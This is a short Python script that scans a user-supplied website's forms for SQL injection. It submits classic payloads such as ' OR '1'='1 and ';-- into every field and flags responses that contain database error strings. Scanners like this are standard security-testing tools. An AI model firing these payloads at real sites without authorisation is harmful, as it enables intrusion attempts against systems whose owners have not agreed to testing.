import requests
from bs4 import BeautifulSoup
import urllib.parse

# Common SQL Injection payloads to test
sql_payloads = ["'", "' OR '1'='1", '" OR "1"="1', "';--", "' OR 1=1--"]

# Common SQL error signatures to look for in responses
sql_errors = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch_array()",
    "syntax error",
    "mysql_num_rows()",
    "ORA-01756",
    "SQLSTATE",
]

def find_forms(url):
    """Fetch the page and parse all forms."""
    res = requests.get(url)
    soup = BeautifulSoup(res.text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extract form details like action, method, and inputs."""
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    return action, method, inputs

def is_vulnerable(response_text):
    """Check if response contains SQL error signatures."""
    for error in sql_errors:
        if error.lower() in response_text.lower():
            return True
    return False

def scan_sql_injection(url):
    forms = find_forms(url)
    vulnerable_forms = []

    for form in forms:
        action, method, inputs = get_form_details(form)
        form_url = urllib.parse.urljoin(url, action) if action else url

        for payload in sql_payloads:
            data = {}
            for input_field in inputs:
                if input_field["type"] == "submit" or input_field["name"] is None:
                    continue
                data[input_field["name"]] = payload

            if method == "post":
                res = requests.post(form_url, data=data)
            else:
                res = requests.get(form_url, params=data)

            if is_vulnerable(res.text):
                vulnerable_forms.append({
                    "url": form_url,
                    "method": method,
                    "payload": payload,
                    "inputs": data
                })
                break  # Stop testing other payloads on this form if vulnerable

    return vulnerable_forms

def main():
    target_url = input("Enter the website URL to scan: ").strip()
    print(f"Scanning {target_url} for SQL Injection vulnerabilities...")

    vulnerable = scan_sql_injection(target_url)

    if vulnerable:
        with open("vulnerability_report.txt", "w") as f:
            for v in vulnerable:
                f.write(f"Potential SQL Injection vulnerability found!\n")
                f.write(f"URL: {v['url']}\n")
                f.write(f"Method: {v['method']}\n")
                f.write(f"Payload: {v['payload']}\n")
                f.write(f"Inputs: {v['inputs']}\n")
                f.write("-" * 50 + "\n")
        print(f"Scan complete. Potential vulnerabilities logged in vulnerability_report.txt")
    else:
        print("No SQL Injection vulnerabilities detected.")

if __name__ == "__main__":
    main()

